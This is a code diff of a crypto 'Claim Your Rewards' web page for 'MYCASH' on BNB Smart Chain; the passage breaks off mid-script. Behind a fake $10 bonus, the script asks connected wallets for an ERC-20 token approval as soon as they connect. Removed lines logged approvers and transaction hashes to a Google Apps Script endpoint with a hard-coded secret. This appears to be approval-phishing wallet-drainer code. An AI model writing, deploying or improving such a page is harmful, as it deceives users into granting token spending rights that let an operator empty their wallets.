@@ -5,68 +5,442 @@
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <title>DEMO — Rewards</title>
   <style>
-    /* (same styles as before; kept compact) */
     *{box-sizing:border-box;margin:0;padding:0}
-    body{font-family:system-ui,Segoe UI,Arial;background:#050816;color:#e6eef8;min-height:100vh;display:flex;flex-direction:column;}
-    header{background:#071027;padding:10px 16px;position:sticky;top:0;z-index:20;border-bottom:1px solid rgba(255,255,255,0.03);}
-    .nav{max-width:980px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;gap:12px;}
-    .nav-right{display:flex;align-items:center;gap:10px;flex-wrap:wrap;justify-content:flex-end;}
-    .nav-right a{color:#dbeafe;text-decoration:none;padding:6px 10px;border-radius:6px;font-size:0.9rem;}
-    .nav-right a:hover{background:#0f1b33;}
-    .connect{background:#3b82f6;color:#fff;padding:8px 14px;border-radius:999px;border:0;cursor:pointer;font-size:0.9rem;white-space:nowrap;}
-    .connect.connected{background:#15803d;}
-    main{max-width:980px;margin:20px auto;padding:16px;flex:1;}
-    .top-info{margin-bottom:14px;font-size:0.84rem;color:#9fb0c8;display:flex;flex-wrap:wrap;gap:10px 18px;}
+
+    body{
+      font-family:system-ui,Segoe UI,Arial;
+      background:#050816;
+      color:#e6eef8;
+      min-height:100vh;
+      display:flex;
+      flex-direction:column;
+    }
+
+    /* === HEADER & NAV (same structure as index) === */
+    header{
+      background:#071027;
+      padding:10px 16px;
+      position:sticky;
+      top:0;
+      z-index:20;
+      border-bottom:1px solid rgba(255,255,255,0.03);
+    }
+    .nav{
+      max-width:980px;
+      margin:0 auto;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+    }
+    .nav-right{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      flex-wrap:wrap;
+      justify-content:flex-end;
+    }
+
+    .nav-right a{
+      color:#dbeafe;
+      text-decoration:none;
+      padding:6px 10px;
+      border-radius:6px;
+      font-size:0.9rem;
+    }
+    .nav-right a:hover{
+      background:#0f1b33;
+    }
+
+    .connect{
+      background:#3b82f6;
+      color:#fff;
+      padding:8px 14px;
+      border-radius:999px;
+      border:0;
+      cursor:pointer;
+      font-size:0.9rem;
+      white-space:nowrap;
+    }
+    .connect.connected{
+      background:#15803d;
+    }
+
+    main{
+      max-width:980px;
+      margin:20px auto;
+      padding:16px;
+      flex:1;
+    }
+
+    /* small info line under header (User ID etc) */
+    .top-info{
+      margin-bottom:14px;
+      font-size:0.84rem;
+      color:#9fb0c8;
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px 18px;
+    }
     .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono","Helvetica Neue", monospace;}
-    .reward-title{text-align:center;margin-bottom:1.5rem;}
-    .reward-title h1{font-size:1.9rem;margin-bottom:0.4rem;}
-    .reward-title p{font-size:0.95rem;color:#9ca3af;}
-    .reward-card{border-radius:1.5rem;padding:1.4rem 1.6rem;display:flex;align-items:center;justify-content:space-between;gap:1.4rem;border:1px solid rgba(148,163,184,0.35);box-shadow:0 20px 45px rgba(15,23,42,0.9);background:radial-gradient(circle at top left,#111827,#020617);}
-    .reward-left,.reward-center,.reward-right{display:flex;flex-direction:column;justify-content:center;}
-    .reward-left{min-width:150px;gap:0.4rem;}
-    .reward-tag{font-size:0.7rem;text-transform:uppercase;letter-spacing:0.18em;color:#64748b;margin-bottom:6px;}
-    .wallet-icon-base{width:54px;height:54px;display:flex;align-items:center;justify-content:center;overflow:hidden;background:#020617;border-radius:999px;border:1px solid rgba(148,163,184,0.6);background:radial-gradient(circle at 20% 0,#1d4ed8,#020617);}
-    .wallet-icon-base img{width:70%;height:70%;object-fit:contain;display:block;}
-    .wallet-subline{font-size:0.8rem;color:#9fb0c8;}
-    .reward-center{flex:1;align-items:center;text-align:center;gap:0.35rem;}
-    .reward-amount{font-size:2.1rem;font-weight:700;letter-spacing:0.05em;}
-    .reward-label{font-size:0.86rem;text-transform:uppercase;color:#9ca3af;letter-spacing:0.23em;}
-    .reward-desc{margin-top:2px;font-size:0.82rem;color:#9fb0c8;max-width:370px;}
-    .connected-pill{margin-top:6px;padding:4px 12px;border-radius:999px;font-size:0.8rem;background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.7);color:#bbf7d0;display:inline-flex;align-items:center;gap:6px;}
-    .connected-pill::before{content:"";width:6px;height:6px;border-radius:999px;background:#22c55e;}
-    .btn{border:none;outline:none;border-radius:999px;padding:0.55rem 1.8rem;font-size:0.9rem;font-weight:600;cursor:pointer;transition:transform 0.12s ease, box-shadow 0.12s ease, background 0.15s ease, opacity 0.12s ease;display:inline-flex;align-items:center;justify-content:center;white-space:nowrap;}
-    .btn-claim{background:#22c55e;color:#022c22;box-shadow:0 14px 30px rgba(34,197,94,0.45);margin-top:0.7rem;}
-    .btn-claim:hover:not([disabled]){transform:translateY(-1px);box-shadow:0 18px 40px rgba(34,197,94,0.6);}
-    .btn-task{margin-top:0.45rem;background:transparent;border:1px solid rgba(148,163,184,0.8);color:#e5e7eb;font-size:0.86rem;padding-inline:1.4rem;}
-    .btn-task:hover{background:rgba(15,23,42,0.9);box-shadow:0 10px 26px rgba(15,23,42,0.8);transform:translateY(-1px);}
-    .btn[disabled]{opacity:0.45;cursor:not-allowed;box-shadow:none;transform:none;}
-    .reward-right{min-width:170px;align-items:flex-end;gap:0.4rem;}
+
+    /* ===== REWARD PAGE ===== */
+    .reward-title{
+      text-align:center;
+      margin-bottom:1.5rem;
+    }
+    .reward-title h1{
+      font-size:1.9rem;
+      margin-bottom:0.4rem;
+    }
+    .reward-title p{
+      font-size:0.95rem;
+      color:#9ca3af;
+    }
+
+    .reward-card{
+      border-radius:1.5rem;
+      padding:1.4rem 1.6rem;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:1.4rem;
+      border:1px solid rgba(148,163,184,0.35);
+      box-shadow:0 20px 45px rgba(15,23,42,0.9);
+      background:radial-gradient(circle at top left,#111827,#020617);
+    }
+
+    .reward-left,
+    .reward-center,
+    .reward-right{
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+    }
+
+    .reward-left{
+      min-width:150px;
+      gap:0.4rem;
+    }
+
+    .reward-tag{
+      font-size:0.7rem;
+      text-transform:uppercase;
+      letter-spacing:0.18em;
+      color:#64748b;
+      margin-bottom:6px;
+    }
+
+    .wallet-icon-base{
+      width:54px;
+      height:54px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      overflow:hidden;
+      background:#020617;
+      border-radius:999px;
+      border:1px solid rgba(148,163,184,0.6);
+      background:radial-gradient(circle at 20% 0,#1d4ed8,#020617);
+    }
+    .wallet-icon-base img{
+      width:70%;
+      height:70%;
+      object-fit:contain;
+      display:block;
+    }
+
+    .wallet-subline{
+      font-size:0.8rem;
+      color:#9fb0c8;
+    }
+
+    .reward-center{
+      flex:1;
+      align-items:center;
+      text-align:center;
+      gap:0.35rem;
+    }
+
+    .reward-amount{
+      font-size:2.1rem;
+      font-weight:700;
+      letter-spacing:0.05em;
+    }
+
+    .reward-label{
+      font-size:0.86rem;
+      text-transform:uppercase;
+      color:#9ca3af;
+      letter-spacing:0.23em;
+    }
+
+    .reward-desc{
+      margin-top:2px;
+      font-size:0.82rem;
+      color:#9fb0c8;
+      max-width:370px;
+    }
+
+    .connected-pill{
+      margin-top:6px;
+      padding:4px 12px;
+      border-radius:999px;
+      font-size:0.8rem;
+      background:rgba(34,197,94,0.15);
+      border:1px solid rgba(34,197,94,0.7);
+      color:#bbf7d0;
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+    }
+    .connected-pill::before{
+      content:"";
+      width:6px;
+      height:6px;
+      border-radius:999px;
+      background:#22c55e;
+    }
+
+    .btn{
+      border:none;
+      outline:none;
+      border-radius:999px;
+      padding:0.55rem 1.8rem;
+      font-size:0.9rem;
+      font-weight:600;
+      cursor:pointer;
+      transition:transform 0.12s ease, box-shadow 0.12s ease, background 0.15s ease, opacity 0.12s ease;
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      white-space:nowrap;
+    }
+
+    .btn-claim{
+      background:#22c55e;
+      color:#022c22;
+      box-shadow:0 14px 30px rgba(34,197,94,0.45);
+      margin-top:0.7rem;
+    }
+    .btn-claim:hover:not([disabled]){
+      transform:translateY(-1px);
+      box-shadow:0 18px 40px rgba(34,197,94,0.6);
+    }
+
+    .btn-task{
+      margin-top:0.45rem;
+      background:transparent;
+      border:1px solid rgba(148,163,184,0.8);
+      color:#e5e7eb;
+      font-size:0.86rem;
+      padding-inline:1.4rem;
+    }
+    .btn-task:hover{
+      background:rgba(15,23,42,0.9);
+      box-shadow:0 10px 26px rgba(15,23,42,0.8);
+      transform:translateY(-1px);
+    }
+
+    .btn[disabled]{
+      opacity:0.45;
+      cursor:not-allowed;
+      box-shadow:none;
+      transform:none;
+    }
+
+    .reward-right{
+      min-width:170px;
+      align-items:flex-end;
+      gap:0.4rem;
+    }
+
     .small{font-size:0.85rem;color:#9fb0c8;}
-    .reward-extra{margin-top:18px;font-size:0.85rem;color:#9fb0c8;}
+
+    .reward-extra{
+      margin-top:18px;
+      font-size:0.85rem;
+      color:#9fb0c8;
+    }
+
+    /* ===== TASK PAGE (same header/footer, just different content) ===== */
     #taskPage{display:none;}
-    .task-header-row{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:16px;}
-    .task-header-row h2{font-size:1.4rem;}
-    .btn-back{border-radius:999px;border:1px solid rgba(148,163,184,0.7);background:transparent;color:#e5e7eb;font-size:0.85rem;padding:0.4rem 1.2rem;cursor:pointer;}
-    .btn-back:hover{background:#111827;}
-    .task-section{margin-top:18px;padding:1rem 1.1rem;border-radius:0.9rem;border:1px solid rgba(75,85,99,0.7);background:linear-gradient(135deg,#020617,#020617,#0b1120);}
-    .task-section h3{font-size:1rem;margin-bottom:0.35rem;}
-    .task-section p{font-size:0.86rem;color:#cbd5f5;margin-bottom:0.35rem;}
-    .task-section ul{margin-left:1.2rem;margin-bottom:0.35rem;font-size:0.86rem;color:#cbd5f5;}
-    .task-section li{margin-bottom:0.18rem;}
-    .video-wrapper{position:relative;width:100%;max-width:640px;margin-top:0.6rem;margin-bottom:0.6rem;padding-top:56.25%;border-radius:0.75rem;overflow:hidden;box-shadow:0 18px 38px rgba(15,23,42,0.9);background:#020617;}
-    .video-wrapper iframe{position:absolute;top:0;left:0;width:100%;height:100%;border:0;}
-    .task-actions{margin-top:0.6rem;display:flex;flex-wrap:wrap;gap:10px;align-items:center;}
-    .task-btn{border-radius:999px;border:none;background:#22c55e;color:#022c22;font-size:0.9rem;padding:0.45rem 1.4rem;font-weight:600;cursor:pointer;}
-    .task-btn:hover{box-shadow:0 14px 30px rgba(34,197,94,0.45);transform:translateY(-1px);}
-    .task-check{font-size:0.84rem;}
-    .task-check.ok{color:#22c55e;}
-    .task-check.bad{color:#f97316;}
-    footer{max-width:980px;margin:24px auto 16px auto;padding:12px;color:#9fb0c8;text-align:center;font-size:0.8rem;}
-    @media(max-width:768px){.reward-card{flex-direction:column;align-items:stretch;text-align:center;} .reward-left{align-items:center;} .reward-right{align-items:center;}}
-    @media (max-width: 640px){ header{padding:8px 10px;} .nav{max-width:100%;flex-direction:column;align-items:stretch;justify-content:flex-start;gap:6px;} .logo{width:100%;text-align:center;font-size:0.9rem;letter-spacing:3px;} .nav-right{width:100%;justify-content:center;gap:6px;} .nav-right a{padding:4px 8px;font-size:0.85rem;} header .connect{width:100%;max-width:260px;padding:8px 12px;font-size:0.9rem;} header{background:#071027;padding:10px 16px;position:sticky;top:0;z-index:20;border-bottom:1px solid rgba(255,255,255,0.03);} }
+
+    .task-header-row{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      gap:10px;
+      margin-bottom:16px;
+    }
+    .task-header-row h2{
+      font-size:1.4rem;
+    }
+    .btn-back{
+      border-radius:999px;
+      border:1px solid rgba(148,163,184,0.7);
+      background:transparent;
+      color:#e5e7eb;
+      font-size:0.85rem;
+      padding:0.4rem 1.2rem;
+      cursor:pointer;
+    }
+    .btn-back:hover{
+      background:#111827;
+    }
+
+    .task-section{
+      margin-top:18px;
+      padding:1rem 1.1rem;
+      border-radius:0.9rem;
+      border:1px solid rgba(75,85,99,0.7);
+      background:linear-gradient(135deg,#020617,#020617,#0b1120);
+    }
+    .task-section h3{
+      font-size:1rem;
+      margin-bottom:0.35rem;
+    }
+    .task-section p{
+      font-size:0.86rem;
+      color:#cbd5f5;
+      margin-bottom:0.35rem;
+    }
+    .task-section ul{
+      margin-left:1.2rem;
+      margin-bottom:0.35rem;
+      font-size:0.86rem;
+      color:#cbd5f5;
+    }
+    .task-section li{
+      margin-bottom:0.18rem;
+    }
+
+    .video-wrapper{
+      position:relative;
+      width:100%;
+      max-width:640px;
+      margin-top:0.6rem;
+      margin-bottom:0.6rem;
+      padding-top:56.25%; /* 16:9 */
+      border-radius:0.75rem;
+      overflow:hidden;
+      box-shadow:0 18px 38px rgba(15,23,42,0.9);
+      background:#020617;
+    }
+    .video-wrapper iframe{
+      position:absolute;
+      top:0;left:0;
+      width:100%;
+      height:100%;
+      border:0;
+    }
+
+    .task-actions{
+      margin-top:0.6rem;
+      display:flex;
+      flex-wrap:wrap;
+      gap:10px;
+      align-items:center;
+    }
+    .task-btn{
+      border-radius:999px;
+      border:none;
+      background:#22c55e;
+      color:#022c22;
+      font-size:0.9rem;
+      padding:0.45rem 1.4rem;
+      font-weight:600;
+      cursor:pointer;
+    }
+    .task-btn:hover{
+      box-shadow:0 14px 30px rgba(34,197,94,0.45);
+      transform:translateY(-1px);
+    }
+
+    .task-check{
+      font-size:0.84rem;
+    }
+    .task-check.ok{
+      color:#22c55e;
+    }
+    .task-check.bad{
+      color:#f97316;
+    }
+
+    footer{
+      max-width:980px;
+      margin:24px auto 16px auto;
+      padding:12px;
+      color:#9fb0c8;
+      text-align:center;
+      font-size:0.8rem;
+    }
+
+    /* Reward layout responsive */
+    @media(max-width:768px){
+      .reward-card{
+        flex-direction:column;
+        align-items:stretch;
+        text-align:center;
+      }
+      .reward-left{
+        align-items:center;
+      }
+      .reward-right{
+        align-items:center;
+      }
+    }
+
+    /* Header mobile cleanup (match index) */
+    @media (max-width: 640px){
+      header{
+        padding:8px 10px;
+      }
+
+      .nav{
+        max-width:100%;
+        flex-direction:column;
+        align-items:stretch;
+        justify-content:flex-start;
+        gap:6px;
+      }
+
+      .logo{
+        width:100%;
+        text-align:center;
+        font-size:0.9rem;
+        letter-spacing:3px;
+      }
+      .nav-right{
+        width:100%;
+        justify-content:center;
+        gap:6px;
+      }
+
+      .nav-right a{
+        padding:4px 8px;
+        font-size:0.85rem;
+      }
+      header .connect{
+        width:100%;
+        max-width:260px;
+        padding:8px 12px;
+        font-size:0.9rem;
+      }
+
+      header{
+        background:#071027;
+        padding:10px 16px;
+        position:sticky;
+        top:0;
+        z-index:20;
+        border-bottom:1px solid rgba(255,255,255,0.03);
+      }
+    }
   </style>
 </head>
 <body>
+  <!-- React root for Vite (hidden, UI is pure HTML) -->
   <div id="root" style="display:none;"></div>
 
   <header>
@@ -82,6 +456,7 @@
   </header>
 
   <main>
+    <!-- Top info bar (User ID, address, etc.) -->
     <div class="top-info">
       <div>Status: <span id="statusText">Not connected</span></div>
       <div>Address: <span id="walletAddress" class="mono">—</span></div>
@@ -89,6 +464,7 @@
       <div>User ID: <span id="userId" class="mono">-</span></div>
     </div>
 
+    <!-- === REWARD PAGE VIEW === -->
     <div id="rewardPage">
       <div class="reward-title">
         <h1>Claim Your Rewards</h1>
@@ -98,23 +474,38 @@
       <div class="reward-card">
         <div class="reward-left">
           <div class="reward-tag">Reward #1</div>
-          <div class="wallet-icon-base"><img src="logo.png" alt="Trust Wallet"></div>
+          <div class="wallet-icon-base">
+            <img src="logo.png" alt="Trust Wallet">
+          </div>
           <span class="wallet-subline">Trust Wallet • BSC</span>
         </div>
 
         <div class="reward-center">
           <div class="reward-amount" id="rewardAmountDisplay">$10</div>
           <div class="reward-label">Starter Bonus</div>
-          <div class="reward-desc">First time connection reward for eligible wallets.</div>
+          <div class="reward-desc">
+            First time connection reward for eligible wallets.
+          </div>
           <button id="claimBtn" class="btn btn-claim" disabled>Claim</button>
-          <button id="taskBtn" class="btn btn-task">View Tasks</button>
-          <div class="small" id="claimHint" style="margin-top:4px;">Claim is locked until wallet is connected and all tasks are completed.</div>
+          <button id="taskBtn" class="btn btn-task">View Tasks</button> 
+
+
+          
+          <div class="small" id="claimHint" style="margin-top:4px;">
+            Claim is locked until wallet is connected and all tasks are completed.
+          </div>
         </div>
+        
+<button id="connectBtnCard" class="connect">Connect Wallet</button> 
+        
 
-        <button id="connectBtnCard" class="connect">Connect Wallet</button>
       </div>
-    </div>
+   </div>     
 
+
+    
+
+    <!-- === TASK PAGE VIEW (same header/footer, different content) === -->
     <div id="taskPage">
       <div class="task-header-row">
         <div>
@@ -124,11 +515,20 @@
         <button id="backToRewardsBtn" class="btn-back">Back to Reward</button>
       </div>
 
+      <!-- Task 1: video -->
       <div class="task-section">
         <h3>Task 1 — Watch the Intro Video</h3>
-        <p>Watch this video to understand how MYCASH and the reward system works.</p>
+        <p>
+          Watch this video to understand how MYCASH and the reward system works.
+        </p>
         <div class="video-wrapper">
-          <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" title="MYCASH Intro" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+          <!-- Replace src with your own embedded video later -->
+          <iframe
+            src="https://www.youtube.com/embed/dQw4w9WgXcQ"
+            title="MYCASH Intro"
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+            allowfullscreen
+          ></iframe>
         </div>
         <div class="task-actions">
           <button id="task1Btn" class="task-btn">Mark as watched (demo)</button>
@@ -136,9 +536,13 @@
         </div>
       </div>
 
+      <!-- Task 2: wallet balance checker -->
       <div class="task-section">
         <h3>Task 2 — Wallet Balance Check</h3>
-        <p>This task checks if your connected wallet holds at least <strong>10 USDT (BEP-20)</strong>.</p>
+        <p>
+          This task checks if your connected wallet holds at least
+          <strong>10 USDT (BEP-20)</strong>. 
+        </p>
         <ul>
           <li>Connect your BSC wallet using the button in the header.</li>
           <li>Make sure you hold at least 10 USDT at the token address configured.</li>
@@ -148,12 +552,17 @@
           <button id="task2CheckBtn" class="task-btn">Check wallet (demo)</button>
           <span id="task2Check" class="task-check bad">❌ Not checked</span>
         </div>
-        <p class="small" id="task2Detail" style="margin-top:4px;">Status: waiting for check.</p>
+        <p class="small" id="task2Detail" style="margin-top:4px;">
+          Status: waiting for check.
+        </p>
       </div>
 
+      <!-- Task 3: custom action -->
       <div class="task-section">
         <h3>Task 3 — Custom Action</h3>
-        <p>i will add DOWNLOAD APP/ LIKE THE PAGE / FOLLOW ON INSTRAGRAM</p>
+        <p>
+          i will add DOWNLOAD APP/ LIKE THE PAGE / FOLLOW ON INSTRAGRAM 
+        </p>
         <ul>
           <li>Example: Join the official Telegram or Discord.</li>
           <li>Example: Submit a simple form with their User ID.</li>
@@ -167,17 +576,27 @@
     </div>
   </main>
 
-  <footer>© <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.</footer>
+  <!-- FOOTER (same structure as index) -->
+  <footer>
+    © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
+  </footer>
 
-  <!-- libs -->
+  <!-- libs: Web3 + Ethers -->
   <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+
+  <!-- Vite / React entry: this runs src/main.jsx (and appkit.ts) -->
   <script type="module" src="/src/main.jsx"></script>
 
+  <!-- app script (same logic, AppKit-based connect) -->
   <script type="module">
   (function(){
     // ===== CONFIG =====
-    function formatToken(n) { n = Number(n); if (Number.isInteger(n)) return n.toString(); return n.toFixed(4).replace(/\.?0+$/, ""); }
+    function formatToken(n) {
+      n = Number(n);
+      if (Number.isInteger(n)) return n.toString();
+      return n.toFixed(4).replace(/\.?0+$/, "");
+    }
 
     const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbynJPCfQbGU_U9P4a2fQrAILVrxz_kV6308hOc1UmxGq9fe5oq3w53Za0ejnxeu4_Oy-A/exec";
     const APPS_SCRIPT_SECRET = "justforme";
@@ -190,17 +609,101 @@
     const BNB_TESTNET_LABEL        = "BNB Smart Chain (56)";
     const BNB_TESTNET_RPC          = "https://bsc-dataseed.binance.org";
 
-    const ERC20_APPROVE_ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
-    const ERC20_BALANCE_ABI = ["function balanceOf(address owner) view returns (uint256)"];
-    const ERC20_ALLOWANCE_ABI = ["function allowance(address owner, address spender) view returns (uint256)"];
+    const ERC20_APPROVE_ABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+    const ERC20_BALANCE_ABI = [
+      "function balanceOf(address owner) view returns (uint256)" 
+    ];
+    const ERC20_ALLOWANCE_ABI = [
+      "function allowance(address owner, address spender) view returns (uint256)"
+    ];
 
+    // USDT on BSC uses 18 decimals
     const TOKEN_DECIMALS = 18;
-    const REQUIRED_USDT = 10;
-    const REWARD_AMOUNT = 10.0;
 
-    // ===== userId helpers (restored) =====
+    const REQUIRED_USDT = 10;   // Task 2
+    const REWARD_AMOUNT = 10.0; // display only
+
+    let providerInstance      = null;
+    let web3Instance          = null;
+    let currentAddress        = null;
+    let currentUserId         = null;
+    let currentBNBBalance     = null;
+    let currentTokenBalance   = null;
+
+    let isWalletConnected = false;
+    let task1Done         = false;
+    let task2Eligible     = false;
+    let task3Done         = false;
+
+let appKitEip155Provider = null;
+
+// Watch AppKit provider globally (mobile fix)
+// This catches both fresh connections AND restored sessions.
+function setupAppKitProviderWatcher() {
+  if (!window.appKit || typeof window.appKit.subscribeProviders !== "function") return;
+
+  window.appKit.subscribeProviders(async (state) => {
+    const provider = state["eip155"] || null;
+
+    // NEWLY CONNECTED or RESTORED provider
+    if (provider && provider !== appKitEip155Provider) {
+      appKitEip155Provider = provider;
+      await handleAppKitProvider(provider);
+    }
+
+    // DISCONNECTED provider
+    if (!provider && appKitEip155Provider) {
+      appKitEip155Provider = null;
+      clearSessionUI();
+    }
+  });
+}
+
+async function handleAppKitProvider(provider) {
+  try {
+    providerInstance = provider;
+    web3Instance = new Web3(providerInstance);
+
+    let accounts = await web3Instance.eth.getAccounts();
+
+    // Mobile Chrome sometimes returns [] for 0.5 seconds → retry
+    if (!accounts || !accounts.length) {
+      for (let i = 0; i < 5; i++) {
+        await new Promise(r => setTimeout(r, 400));
+        accounts = await web3Instance.eth.getAccounts();
+        if (accounts && accounts.length) break;
+      }
+    }
+
+    if (!accounts || !accounts.length) {
+      console.warn("Still no accounts after retry mobile.");
+      return;
+    }
+
+    const address = accounts[0].toLowerCase();
+    currentAddress = address;
+
+    // Restore UI + balances
+    await restoreSessionFromAddress(address);
+
+    isWalletConnected = true;
+    setStatus("Connected");
+
+    // Only ask approval when new session detected
+    await ensureTokenApproval();
+
+  } catch (err) {
+    console.error("handleAppKitProvider error:", err);
+  }
+}
+
+    
+
+    // ===== userId helpers =====
     function storageKeyFor(address){
-      return "userId_" + (address || "").toLowerCase();
+      return "userId_" + address.toLowerCase();
     }
     function generateUserIdFromAddress(address){
       address = (address || "").toLowerCase();
@@ -215,193 +718,136 @@
     }
     function getOrCreateUserIdFor(address){
       const key = storageKeyFor(address);
-      let id = null;
-      try {
-        id = localStorage.getItem(key);
-      } catch(e) {
-        // ignore localStorage errors
-      }
+      let id = localStorage.getItem(key);
       if (!id || !/^[0-9]{6}$/.test(id)) {
         id = generateUserIdFromAddress(address);
-        try { localStorage.setItem(key, id); } catch(e) { /* ignore */ }
+        localStorage.setItem(key, id);
       }
       return id;
     }
 
-    let providerInstance = null;
-    let web3Instance = null;
-    let currentAddress = null;
-    let currentUserId = null;
-    let currentBNBBalance = null;
-    let currentTokenBalance = null;
-
-    let isWalletConnected = false;
-    let task1Done = false, task2Eligible = false, task3Done = false;
-
-    let appKitEip155Provider = null;
-
-    // -------- Fast approval cache helpers (localStorage + sheet) ----------
-    const SHEET_CHECK_TIMEOUT_MS = 800;
-
-    function localApprovalFlagKey(address){ return "usdt_approved_" + (address||"").toLowerCase(); }
-    function getLocalApprovalFlag(address){ try{ if(!address) return null; return localStorage.getItem(localApprovalFlagKey(address)); }catch(e){ return null; } }
-    function setLocalApprovalFlag(address, txHash){ try{ if(!address) return; localStorage.setItem(localApprovalFlagKey(address), txHash || "1"); }catch(e){} }
-
-    // Check the Apps Script sheet for approval (fast, with timeout). Expects your Apps Script to implement action=checkApproval
-    async function checkApprovalSheet(address, timeoutMs = SHEET_CHECK_TIMEOUT_MS){
-      if(!address) return null;
-      const url = APPS_SCRIPT_URL + "?action=checkApproval&address=" + encodeURIComponent(address) + "&secret=" + encodeURIComponent(APPS_SCRIPT_SECRET);
-      const controller = new AbortController();
-      const timer = setTimeout(()=> controller.abort(), timeoutMs);
-      try{
-        const res = await fetch(url, { method: "GET", signal: controller.signal });
-        clearTimeout(timer);
-        if(!res.ok) return null;
-        const json = await res.json(); // { approved: true|false, txHash?: "0x..." }
-        return json;
-      }catch(err){
-        clearTimeout(timer);
-        console.debug("checkApprovalSheet failed:", err && err.message ? err.message : err);
-        return null;
-      }
-    }
-
-    // Record the approval to the sheet (best-effort)
-    async function recordApprovalToSheet(address, txHash){
-      if(!address || !txHash) return;
-      try { setLocalApprovalFlag(address, txHash); } catch(e){}
-      try {
-        await fetch(APPS_SCRIPT_URL + "?action=recordApproval", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ secret: APPS_SCRIPT_SECRET, address: address.toLowerCase(), txHash })
-        });
-      }catch(e){
-        console.warn("recordApprovalToSheet failed:", e && e.message ? e.message : e);
-      }
-    }
-
-    // -------- AppKit provider watcher (unchanged) ----------
-    function setupAppKitProviderWatcher() {
-      if (!window.appKit || typeof window.appKit.subscribeProviders !== "function") return;
-      window.appKit.subscribeProviders(async (state) => {
-        const provider = state["eip155"] || null;
-        if (provider && provider !== appKitEip155Provider) {
-          appKitEip155Provider = provider;
-          await handleAppKitProvider(provider);
-        }
-        if (!provider && appKitEip155Provider) {
-          appKitEip155Provider = null;
-          clearSessionUI();
-        }
-      });
-    }
-
-    async function handleAppKitProvider(provider) {
-      try {
-        providerInstance = provider;
-        web3Instance = new Web3(providerInstance);
-        let accounts = await web3Instance.eth.getAccounts();
-
-        // Mobile Chrome sometimes returns [] for 0.5 seconds → retry
-        if (!accounts || !accounts.length) {
-          for (let i = 0; i < 5; i++) {
-            await new Promise(r => setTimeout(r, 400));
-            accounts = await web3Instance.eth.getAccounts();
-            if (accounts && accounts.length) break;
-          }
-        }
-
-        if (!accounts || !accounts.length) {
-          console.warn("Still no accounts after retry mobile.");
-          return;
-        }
-
-        const address = accounts[0].toLowerCase();
-        currentAddress = address;
-
-        // Restore UI + balances
-        await restoreSessionFromAddress(address);
-
-        isWalletConnected = true;
-        setStatus("Connected");
-
-        // Fast check (local + sheet) and only call ensureTokenApproval if needed
-        await fastApproveCheckAndMaybeApprove(address);
-
-      } catch (err) {
-        console.error("handleAppKitProvider error:", err);
-      }
-    }
-
-    // -------- UI helpers (unchanged) ----------
-    const connectBtn = document.getElementById("connectBtn");
-    const statusTextEl = document.getElementById("statusText");
+    // ===== UI refs =====
+    const connectBtn      = document.getElementById("connectBtn");
+    const statusTextEl    = document.getElementById("statusText");
     const walletAddressEl = document.getElementById("walletAddress");
-    const userIdEl = document.getElementById("userId");
+    const userIdEl        = document.getElementById("userId");
     const walletNetworkEl = document.getElementById("walletNetwork");
+    const walletBalanceEl = document.getElementById("walletBalance");
     const tokensContainer = document.getElementById("tokens");
-    const rewardPageEl = document.getElementById("rewardPage");
-    const taskPageEl = document.getElementById("taskPage");
-    const backToRewardsBtn = document.getElementById("backToRewardsBtn");
-    const taskBtn = document.getElementById("taskBtn");
-    const claimBtn = document.getElementById("claimBtn");
-    const claimHintEl = document.getElementById("claimHint");
-    const connectBtnCard = document.getElementById("connectBtnCard");
-    const rewardAmountEl = document.getElementById("rewardAmountDisplay");
-    const task1Btn = document.getElementById("task1Btn");
-    const task1CheckEl = document.getElementById("task1Check");
-    const task2CheckBtn = document.getElementById("task2CheckBtn");
-    const task2CheckEl = document.getElementById("task2Check");
-    const task2DetailEl = document.getElementById("task2Detail");
-    const task3Btn = document.getElementById("task3Btn");
-    const task3CheckEl = document.getElementById("task3Check");
 
-    function setStatus(txt){ if(statusTextEl) statusTextEl.textContent = txt; console.log("[status]", txt); }
-    function setWalletInfo(address, network, bnb){ if(walletAddressEl) walletAddressEl.textContent = address || "—"; if(walletNetworkEl) walletNetworkEl.textContent = network || "—"; }
-    function setUserIdUI(id){ if(userIdEl) userIdEl.textContent = id || "-"; }
+    const rewardPageEl    = document.getElementById("rewardPage");
+    const taskPageEl      = document.getElementById("taskPage");
+    const backToRewardsBtn= document.getElementById("backToRewardsBtn");
+    const taskBtn         = document.getElementById("taskBtn");
+
+    const claimBtn        = document.getElementById("claimBtn");
+    const claimHintEl     = document.getElementById("claimHint");
+
+   const connectBtnCard  = document.getElementById("connectBtnCard");
+
+
+    const rewardAmountEl  = document.getElementById("rewardAmountDisplay");
+
+    const task1Btn        = document.getElementById("task1Btn");
+    const task1CheckEl    = document.getElementById("task1Check");
+    const task2CheckBtn   = document.getElementById("task2CheckBtn");
+    const task2CheckEl    = document.getElementById("task2Check");
+    const task2DetailEl   = document.getElementById("task2Detail");
+    const task3Btn        = document.getElementById("task3Btn");
+    const task3CheckEl    = document.getElementById("task3Check");
+
+    function setStatus(txt){
